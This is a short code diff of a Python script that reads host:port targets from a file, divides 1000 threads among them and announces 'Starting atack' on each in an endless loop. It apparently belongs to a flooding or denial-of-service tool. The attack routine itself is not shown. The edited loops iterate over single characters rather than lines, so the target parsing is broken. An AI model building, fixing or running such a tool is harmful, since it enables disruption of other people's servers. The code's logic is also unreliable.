@@ -31,13 +31,14 @@ while 1 == 1:
     
     with open("target.txt",'r') as f:
         rows = f.read()
-        print (rows)
+        f.seek(0)
+        count_targets = len(f.readlines())
+        print (rows, count_targets)
         for row in rows:
-            rrow = row.split()
-            count_targets = len(rrow)
             print(count_targets)
             count_threads = int(1000//count_targets)
-            for r in rrow:
+            print(count_threads)
+            for r in row:
                 trgt = r.split(":")
                 print ("Starting atack to %s with %s threads on %s port" % (trgt[0], count_threads, trgt[1]))
                 for i in range(count_threads):
